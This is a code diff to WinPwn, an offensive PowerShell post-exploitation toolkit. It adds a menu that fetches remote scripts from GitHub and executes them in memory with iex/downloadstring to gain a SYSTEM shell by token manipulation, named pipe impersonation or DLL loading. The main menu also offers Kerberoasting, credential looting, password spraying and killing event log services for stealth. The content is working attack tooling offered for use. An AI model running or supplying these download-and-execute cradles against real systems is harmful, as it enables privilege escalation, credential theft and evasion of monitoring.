@@ -1071,6 +1071,47 @@ __        ___       ____
  While ($masterquestion -ne 9)
 }
 
+function SYSTEMShell
+{
+    pathcheck
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    @'
+
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+
+   --> SYSTEM Shellz
+
+'@
+    
+    do
+    {
+        Write-Host "================ WinPwn ================"
+        Write-Host -ForegroundColor Green '1. Pop System Shell using CreateProcess!'
+        Write-Host -ForegroundColor Green '2. Bind System Shell using CreateProcess! '
+        Write-Host -ForegroundColor Green '3. Pop System Shell using NamedPipe Impersonation! '
+        Write-Host -ForegroundColor Green '4. Bind System Shell using UsoClient DLL load!'
+	Write-Host -ForegroundColor Green '5. Pop System Shell using Token Manipulation!'
+        Write-Host -ForegroundColor Green '6. Exit. '
+        Write-Host "================ WinPwn ================"
+        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+        Switch ($masterquestion) 
+        {
+             1{iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')}
+             2{iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')}
+             3{iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')}
+             4{iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')}
+	     5{iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem}
+       }
+    }
+ While ($masterquestion -ne 6)
+
+}
+
 function UACBypass
 {
     pathcheck
@@ -2330,15 +2371,16 @@ __        ___       ____
         Write-Host -ForegroundColor Green '4. Local privilege escalation checks! '
         Write-Host -ForegroundColor Green '5. Get SYSTEM using Windows Kernel Exploits! '
 	Write-Host -ForegroundColor Green '6. Bypass UAC! '
-        Write-Host -ForegroundColor Green '7. Kerberoasting! '
-        Write-Host -ForegroundColor Green '8. Loot local Credentials! '
-        Write-Host -ForegroundColor Green '9. Create an ADIDNS Wildcard! '
-        Write-Host -ForegroundColor Green '10. Sessiongopher! '
-        Write-Host -ForegroundColor Green '11. Kill the event log services for stealth! '
-	Write-Host -ForegroundColor Green '12. Execute some C# Magic for Creds, Recon and Privesc!'
-	Write-Host -ForegroundColor Green '13. Load custom C# Binaries from a webserver to Memory and execute them!'
-	Write-Host -ForegroundColor Green '14. DomainPasswordSpray Attacks!'
-        Write-Host -ForegroundColor Green '15. Exit. '
+	Write-Host -ForegroundColor Green '7. Get a SYSTEM Shell! '
+        Write-Host -ForegroundColor Green '8. Kerberoasting! '
+        Write-Host -ForegroundColor Green '9. Loot local Credentials! '
+        Write-Host -ForegroundColor Green '10. Create an ADIDNS Wildcard! '
+        Write-Host -ForegroundColor Green '11. Sessiongopher! '
+        Write-Host -ForegroundColor Green '12. Kill the event log services for stealth! '
+	Write-Host -ForegroundColor Green '13. Execute some C# Magic for Creds, Recon and Privesc!'
+	Write-Host -ForegroundColor Green '14. Load custom C# Binaries from a webserver to Memory and execute them!'
+	Write-Host -ForegroundColor Green '15. DomainPasswordSpray Attacks!'
+        Write-Host -ForegroundColor Green '16. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -2350,18 +2392,19 @@ __        ___       ____
              4{privescmodules}
              5{kernelexploits}
 	     6{UACBypass}
-             7{kerberoasting}
-             8{kittielocal}
-             9{adidnswildcard}
-             10{sessionGopher}
-            11{inv-phantom}
-            12{sharpcradle -allthosedotnet $true}
-	    13{sharpcradle}
-            14{domainpassspray}
+	     7{SYSTEMShell}
+             8{kerberoasting}
+             9{kittielocal}
+             10{adidnswildcard}
+             11{sessionGopher}
+            12{inv-phantom}
+            13{sharpcradle -allthosedotnet $true}
+	    14{sharpcradle}
+            15{domainpassspray}
         
     }
     }
- While ($masterquestion -ne 15)
+ While ($masterquestion -ne 16)
      
     
     #End
